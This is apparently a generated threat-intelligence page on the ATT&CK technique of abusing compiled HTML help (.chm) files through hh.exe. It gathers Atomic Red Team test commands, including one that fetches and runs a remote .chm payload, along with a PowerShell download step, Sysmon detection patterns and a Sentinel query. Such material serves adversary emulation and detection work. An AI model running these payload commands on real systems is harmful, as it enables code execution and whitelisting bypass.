
# Compiled HTML File

## Description

### MITRE Description

> Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)

Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Application whitelisting', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1223

## Potential Commands

```
hh.exe PathToAtomicsFolder\T1223\src\T1223.chm

hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm

\windows\hh.exe.chm
hh.exe|.chm
```

## Commands Dataset

```
[{'command': 'hh.exe PathToAtomicsFolder\\T1223\\src\\T1223.chm\n',
  'name': None,
  'source': 'atomics/T1223/T1223.yaml'},
 {'command': 'hh.exe '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm\n',
  'name': None,
  'source': 'atomics/T1223/T1223.yaml'},
 {'command': '\\windows\\hh.exe.chm',
  'name': None,
  'source': 'SysmonHunter - Compiled HTML File'},
 {'command': 'hh.exe|.chm',
  'name': None,
  'source': 'SysmonHunter - Compiled HTML File'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'Compiled HTML File',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and process_path contains "hh.exe"'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Compiled HTML File': {'atomic_tests': [{'auto_generated_guid': '5cb87818-0d7c-4469-b7ef-9224107aebe8',
                                                                  'dependencies': [{'description': 'The '
                                                                                                   'payload '
                                                                                                   'must '
                                                                                                   'exist '
                                                                                                   'on '
                                                                                                   'disk '
                                                                                                   'at '
                                                                                                   'specified '
                                                                                                   'location '
                                                                                                   '(#{local_chm_file})\n',
                                                                                    'get_prereq_command': 'New-Item '
                                                                                                          '-Type '
                                                                                                          'Directory '
                                                                                                          '(split-path '
                                                                                                          '#{local_chm_file}) '
                                                                                                          '-ErrorAction '
                                                                                                          'ignore '
                                                                                                          '| '
                                                                                                          'Out-Null\n'
                                                                                                          'Invoke-WebRequest '
                                                                                                          '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1223/src/T1223.chm" '
                                                                                                          '-OutFile '
                                                                                                          '"#{local_chm_file}"\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(Test-Path '
                                                                                                      '#{local_chm_file}) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'}],
                                                                  'dependency_executor_name': 'powershell',
                                                                  'description': 'Uses '
                                                                                 'hh.exe '
                                                                                 'to '
                                                                                 'execute '
                                                                                 'a '
                                                                                 'local '
                                                                                 'compiled '
                                                                                 'HTML '
                                                                                 'Help '
                                                                                 'payload.\n'
                                                                                 'Upon '
                                                                                 'execution '
                                                                                 'calc.exe '
                                                                                 'will '
                                                                                 'open\n',
                                                                  'executor': {'command': 'hh.exe '
                                                                                          '#{local_chm_file}\n',
                                                                               'elevation_required': False,
                                                                               'name': 'command_prompt'},
                                                                  'input_arguments': {'local_chm_file': {'default': 'PathToAtomicsFolder\\T1223\\src\\T1223.chm',
                                                                                                         'description': 'Local '
                                                                                                                        '.chm '
                                                                                                                        'payload',
                                                                                                         'type': 'path'}},
                                                                  'name': 'Compiled '
                                                                          'HTML '
                                                                          'Help '
                                                                          'Local '
                                                                          'Payload',
                                                                  'supported_platforms': ['windows']},
                                                                 {'auto_generated_guid': '0f8af516-9818-4172-922b-42986ef1e81d',
                                                                  'description': 'Uses '
                                                                                 'hh.exe '
                                                                                 'to '
                                                                                 'execute '
                                                                                 'a '
                                                                                 'remote '
                                                                                 'compiled '
                                                                                 'HTML '
                                                                                 'Help '
                                                                                 'payload.\n'
                                                                                 'Upon '
                                                                                 'execution '
                                                                                 'displays '
                                                                                 'an '
                                                                                 'error '
                                                                                 'saying '
                                                                                 'the '
                                                                                 'file '
                                                                                 'cannot '
                                                                                 'be '
                                                                                 'open\n',
                                                                  'executor': {'command': 'hh.exe '
                                                                                          '#{remote_chm_file}\n',
                                                                               'elevation_required': False,
                                                                               'name': 'command_prompt'},
                                                                  'input_arguments': {'remote_chm_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm',
                                                                                                          'description': 'Remote '
                                                                                                                         '.chm '
                                                                                                                         'payload',
                                                                                                          'type': 'url'}},
                                                                  'name': 'Compiled '
                                                                          'HTML '
                                                                          'Help '
                                                                          'Remote '
                                                                          'Payload',
                                                                  'supported_platforms': ['windows']}],
                                                'attack_technique': 'T1223',
                                                'display_name': 'Compiled HTML '
                                                                'File'}},
 {'SysmonHunter - T1223': {'description': None,
                           'level': 'medium',
                           'name': 'Compiled HTML File',
                           'phase': 'Execution',
                           'query': [{'file': {'path': {'pattern': '.chm'}},
                                      'process': {'image': {'pattern': '\\windows\\hh.exe'}},
                                      'type': 'process'},
                                     {'process': {'cmdline': {'op': 'and',
                                                              'pattern': 'hh.exe|.chm'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Execution](../tactics/Execution.md)
    

# Mitigations

None

# Actors


* [Lazarus Group](../actors/Lazarus-Group.md)

* [Dark Caracal](../actors/Dark-Caracal.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Silence](../actors/Silence.md)
    
* [APT41](../actors/APT41.md)
    
